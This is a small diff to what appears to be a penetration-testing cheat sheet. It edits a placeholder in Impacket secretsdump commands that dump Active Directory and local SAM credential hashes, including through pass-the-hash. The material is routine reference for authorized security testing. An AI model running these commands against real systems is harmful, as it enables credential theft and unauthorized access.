@@ -25,7 +25,7 @@ Most of these methods will work without any extra work, but for reference I'll a
 ## Impacket SecretsDump:
 {% highlight shell %}
     python3 secretsdump.py <AD FQDN>/<USERNAME>:<PASSWORD>@<IP ADDRESS>
-    python3 secretsdump.py -hashes <NTLM FULL HASH> <FQDN>/<USER>@<IP ADDRESS>
+    python3 secretsdump.py -hashes <NTLM FULL HASH> <AD FQDN>/<USER>@<IP ADDRESS>
     python3 secretsdump.py -sam <SAMNAME> -security <SECURITYNAME> -system <SYSTEMNAME> LOCAL
 {% endhighlight %}
 
